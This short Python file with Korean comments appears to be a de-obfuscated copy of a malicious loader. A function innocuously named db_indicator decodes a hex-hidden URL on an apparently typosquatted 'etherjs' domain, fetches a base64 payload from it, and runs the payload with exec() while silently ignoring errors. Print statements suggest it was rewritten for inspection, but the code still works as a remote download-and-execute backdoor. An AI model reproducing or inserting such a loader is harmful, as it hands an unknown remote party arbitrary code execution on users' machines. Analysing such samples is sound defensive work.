import requests
import base64

def db_indicator():
    try:
        # hex로 인코딩된 URL을 복호화
        method_hex = '68747470733a2f2f6170692e65746865726a732e70726f2f736f636b6574'
        url = bytes.fromhex(method_hex).decode('utf-8')
        print(url)

        # URL로 GET 요청
        res = requests.get(url)
        res.raise_for_status()

        # 응답에서 base64 인코딩된 message 추출
        json_data = res.json()
        encoded_message = json_data.get('message', '')
        print(encoded_message)

        # base64 디코딩 후 문자열을 코드처럼 실행
        decoded_code = base64.b64decode(encoded_message).decode('utf-8')
        print(decoded_code)
        exec(decoded_code)

    except Exception as e:
        print(e)
        pass  # 오류 무시 (원 코드와 동일)


